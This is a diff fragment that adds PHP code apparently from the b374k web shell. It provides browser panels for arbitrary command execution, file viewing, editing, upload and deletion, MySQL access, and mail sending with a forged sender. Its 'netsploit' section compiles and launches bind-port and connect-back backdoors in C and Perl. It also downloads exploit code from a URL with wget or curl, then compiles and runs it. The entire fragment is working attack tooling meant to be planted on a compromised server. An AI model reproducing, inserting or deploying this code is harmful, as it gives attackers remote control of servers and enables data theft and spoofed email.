+                    $msg .= '<tr><td><a href="?y=' . $pwd . '&amp;x=mysql&amp;sqlhost=' . $sqlhost . '&amp;sqluser=' . $sqluser . '&amp;sqlpass=' . $sqlpass . '&amp;sqlport=' . $sqlport . '&amp;db=' . $db . "\">$db</a></td></tr>";
+                }
+                $msg .= '</table>';
+            }
+            @mysql_close($con);
+        } else {
+            $msg = '<p style="text-align:center;">cant connect to mysql server</p>';
+        }
+        echo $msg;
+    } else { ?> <form action="?" method="get"> <input type="hidden" name="y" value="<?php echo $pwd; ?>" /> <input type="hidden" name="x" value="mysql" /> <table class="tabnet" style="width:300px;"> <tr><th colspan="2">Connect to mySQL server</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr> </table> </form> <?php }
+} elseif (isset($_GET['x']) && ('mail' == $_GET['x'])) {
+    $msg = '';
+    if (isset($_POST['mail_send'])) {
+        $mail_to = $_POST['mail_to'];
+        $mail_from = $_POST['mail_from'];
+        $mail_subject = $_POST['mail_subject'];
+        $mail_content = magicboom($_POST['mail_content']);
+        if (@mail($mail_to, $mail_subject, $mail_content, "FROM:$mail_from")) {
+            $msg = "email sent to $mail_to";
+        } else {
+            $msg = 'send email failed';
+        }
+    } ?> <form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post"> <table class="cmdbox"> <tr><td> <textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ASAP ;-p</textarea> <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr> <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="b374k@fbi.gov" name="mail_from" />&nbsp; from</td></tr> <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr> <tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form> <tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr> </table> </form> <?php
+} elseif (isset($_GET['x']) && ('phpinfo' == $_GET['x'])) {
+        @ob_start();
+        @eval('phpinfo();');
+        $buff = @ob_get_contents();
+        @ob_end_clean();
+        $awal = strpos($buff, '<body>') + 6;
+        $akhir = strpos($buff, '</body>');
+        echo '<div class="phpinfo">' . substr($buff, $awal, $akhir - $awal) . '</div>';
+    } elseif (isset($_GET['view']) && ('' != $_GET['view'])) {
+        if (is_file($_GET['view'])) {
+            if (!isset($file)) {
+                $file = magicboom($_GET['view']);
+            }
+            if (!$win && $posix) {
+                $name = @posix_getpwuid(@fileowner($file));
+                $group = @posix_getgrgid(@filegroup($file));
+                $owner = $name['name'] . '<span class="gaya"> : </span>' . $group['name'];
+            } else {
+                $owner = $user;
+            }
+            $filn = basename($file);
+            echo '<table style="margin:6px 0 0 2px;line-height:20px;"> <tr><td>Filename</td><td><span id="' . clearspace($filn) . '_link">' . $file . '</span> <form action="?y=' . $pwd . "&amp;view=$file\" method=\"post\" id=\"" . clearspace($filn) . '_form" class="sembunyi" style="margin:0;padding:0;"> <input type="hidden" name="oldname" value="' . $filn . '" style="margin:0;padding:0;" /> <input class="inputz" style="width:200px;" type="text" name="newname" value="' . $filn . "\" /> <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> <input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\" /> </form> </td></tr> <tr><td>Size</td><td>" . ukuran($file) . '</td></tr> <tr><td>Permission</td><td>' . get_perms($file) . '</td></tr> <tr><td>Owner</td><td>' . $owner . '</td></tr> <tr><td>Create time</td><td>' . date('d-M-Y H:i', @filectime($file)) . '</td></tr> <tr><td>Last modified</td><td>' . date('d-M-Y H:i', @filemtime($file)) . '</td></tr> <tr><td>Last accessed</td><td>' . date('d-M-Y H:i', @fileatime($file)) . "</td></tr> <tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('" . clearspace($filn) . "_link','" . clearspace($filn) . "_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr> <tr><td>View</td><td><a href=\"?y=" . $pwd . '&amp;view=' . $file . '">text</a> | <a href="?y=' . $pwd . '&amp;view=' . $file . '&amp;type=code">code</a> | <a href="?y=' . $pwd . '&amp;view=' . $file . '&amp;type=image">image</a></td></tr> </table> ';
+            if (isset($_GET['type']) && ('image' == $_GET['type'])) {
+                echo '<div style="text-align:center;margin:8px;"><img src="?y=' . $pwd . '&amp;img=' . $filn . '"></div>';
+            } elseif (isset($_GET['type']) && ('code' == $_GET['type'])) {
+                echo '<div class="viewfile">';
+                $file = wordwrap(@file_get_contents($file), '240', "\n");
+                @highlight_string($file);
+                echo '</div>';
+            } else {
+                echo '<div class="viewfile">';
+                echo nl2br(htmlentities((@file_get_contents($file))));
+                echo '</div>';
+            }
+        } elseif (is_dir($_GET['view'])) {
+            echo showdir($pwd, $prompt);
+        }
+    } elseif (isset($_GET['edit']) && ('' != $_GET['edit'])) {
+        if (isset($_POST['save'])) {
+            $file = $_POST['saveas'];
+            $content = magicboom($_POST['content']);
+            if ($filez = @fopen($file, 'w')) {
+                $time = date('d-M-Y H:i', time());
+                if (@fwrite($filez, $content)) {
+                    $msg = 'file saved <span class="gaya">@</span> ' . $time;
+                } else {
+                    $msg = 'failed to save';
+                }
+                @fclose($filez);
+            } else {
+                $msg = 'permission denied';
+            }
+        }
+        if (!isset($file)) {
+            $file = $_GET['edit'];
+        }
+        if ($filez = @fopen($file, 'r')) {
+            $content = '';
+            while (!feof($filez)) {
+                $content .= htmlentities(str_replace("''", "'", fgets($filez)));
+            }
+            @fclose($filez);
+        } ?> <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post"> <table class="cmdbox"> <tr><td colspan="2"> <textarea class="output" name="content"> <?php echo $content; ?> </textarea> <tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /> &nbsp;<?php echo $msg; ?></td></tr> </table> </form> <?php
+    } elseif (isset($_GET['x']) && ('upload' == $_GET['x'])) {
+        $msg = '';
+
+        if (isset($_POST['uploadcomp'])) {
+            if (is_uploaded_file($_FILES['file']['tmp_name'])) {
+                $path = magicboom($_POST['path']);
+                $fname = $_FILES['file']['name'];
+                $tmp_name = $_FILES['file']['tmp_name'];
+                $pindah = $path . $fname;
+                $stat = @move_uploaded_file($tmp_name, $pindah);
+                if ($stat) {
+                    $msg = "file uploaded to $pindah";
+                } else {
+                    $msg = "failed to upload $fname";
+                }
+            } else {
+                $msg = "failed to upload $fname";
+            }
+        } elseif (isset($_POST['uploadurl'])) {
+            $pilihan = trim($_POST['pilihan']);
+            $wurl = trim($_POST['wurl']);
+            $path = magicboom($_POST['path']);
+            $namafile = download($pilihan, $wurl);
+            $pindah = $path . $namafile;
+            if (is_file($pindah)) {
+                $msg = "file uploaded to $pindah";
+            } else {
+                $msg = "failed to upload $namafile";
+            }
+        } ?> <form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"> <table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Upload from computer</th></tr> <tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> </tr> </table></form> <table class="tabnet" style="width:320px;padding:0 1px;"> <tr><th colspan="2">Upload from url</th></tr> <tr><td colspan="2"><form method="post" style="margin:0;padding:0;" actions="?y=<?php echo $pwd; ?>&amp;x=upload"> <table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr> <tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> <?php
+    } elseif (isset($_GET['x']) && ('netsploit' == $_GET['x'])) {
+        $msg = '';
+        if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ('C' == $_POST['use'])) {
+            $port = trim($_POST['port']);
+            $passwrd = trim($_POST['bind_pass']);
+            tulis('bdc.c', $port_bind_bd_c);
+            exe('gcc -o bdc bdc.c');
+            exe('chmod 777 bdc');
+            @unlink('bdc.c');
+            exe('./bdc ' . $port . ' ' . $passwrd . ' &');
+            $scan = exe('ps aux');
+            if (eregi("./bdc $por", $scan)) {
+                $msg = '<p>Process found running, backdoor setup successfully.</p>';
+            } else {
+                $msg = '<p>Process not found running, backdoor not setup successfully.</p>';
+            }
+        } elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ('Perl' == $_POST['use'])) {
+            $port = trim($_POST['port']);
+            $passwrd = trim($_POST['bind_pass']);
+            tulis('bdp', $port_bind_bd_pl);
+            exe('chmod 777 bdp');
+            $p2 = which('perl');
+            exe($p2 . ' bdp ' . $port . ' &');
+            $scan = exe('ps aux');
+            if (eregi("$p2 bdp $port", $scan)) {
+                $msg = '<p>Process found running, backdoor setup successfully.</p>';
+            } else {
+                $msg = '<p>Process not found running, backdoor not setup successfully.</p>';
+            }
+        } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ('C' == $_POST['use'])) {
+            $ip = trim($_POST['ip']);
+            $port = trim($_POST['backport']);
+            tulis('bcc.c', $back_connect_c);
+            exe('gcc -o bcc bcc.c');
+            exe('chmod 777 bcc');
+            @unlink('bcc.c');
+            exe('./bcc ' . $ip . ' ' . $port . ' &');
+            $msg = 'Now script try connect to ' . $ip . ' port ' . $port . ' ...';
+        } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ('Perl' == $_POST['use'])) {
+            $ip = trim($_POST['ip']);
+            $port = trim($_POST['backport']);
+            tulis('bcp', $back_connect);
+            exe('chmod +x bcp');
+            $p2 = which('perl');
+            exe($p2 . ' bcp ' . $ip . ' ' . $port . ' &');
+            $msg = 'Now script try connect to ' . $ip . ' port ' . $port . ' ...';
+        } elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {
+            $pilihan = trim($_POST['pilihan']);
+            $wurl = trim($_POST['wurl']);
+            $namafile = download($pilihan, $wurl);
+            if (is_file($namafile)) {
+                $msg = exe($wcmd);
+            } else {
+                $msg = "error: file not found $namafile";
+            }
+        } ?> <table class="tabnet"> <tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr> <tr> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport; ?>"></td></tr> <tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"></td></tr></form> </table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>IP</td><td><input class="inputz" type="text" name="ip" size="26" value="<?php echo (getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ('127.0.0.1'); ?>"></td></tr> <tr><td>Port</td><td><input class="inputz" type="text" name="backport" size="26" value="<?php echo $bindport; ?>"></td></tr> <tr><td>Use</td><td style="text-align:justify"><p><select size="1" class="inputz" name="use"><option value="Perl">Perl</option><option value="C">C</option></select> <input type="submit" name="backconn" value="Connect" class="inputzbut" style="width:120px"></td></tr></form> </table> </td> <td> <table> <form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"> <tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="www.some-code/exploits.c"></td></tr> <tr><td>cmd</td><td><input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"></td> </tr> <tr><td><select size="1" class="inputz" name="pilihan"> <option value="wwget">wget</option> <option value="wlynx">lynx</option> <option value="wfread">fread</option> <option value="wfetch">fetch</option> <option value="wlinks">links</option> <option value="wget">GET</option> <option value="wcurl">curl</option> </select></td><td colspan="2"><input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"></td></tr></form> </table> </td> </tr> </table> <div style="text-align:center;margin:2px;"><?php echo $msg; ?></div> <?php
+    } elseif (isset($_GET['x']) && ('shell' == $_GET['x'])) { ?> <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post"> <table class="cmdbox"> <tr><td colspan="2"> <textarea class="output" readonly> <?php if (isset($_POST['submitcmd'])) {
+        echo @exe($_POST['cmd']);
+    } ?> </textarea> <tr><td colspan="2"><?php echo $prompt; ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /></td></tr> </table> </form> <?php } else {
+        if (isset($_GET['delete']) && ('' != $_GET['delete'])) {
+            $file = $_GET['delete'];
+            @unlink($file);
+        } elseif (isset($_GET['fdelete']) && ('' != $_GET['fdelete'])) {
+            @rmdir(rtrim($_GET['fdelete'], DIRECTORY_SEPARATOR));
+        } elseif (isset($_GET['mkdir']) && ('' != $_GET['mkdir'])) {
+            $path = $pwd . $_GET['mkdir'];
+            @mkdir($path);
+        }
+        $buff = showdir($pwd, $prompt);
+        echo $buff;
+    } ?> </div> </body> </html>
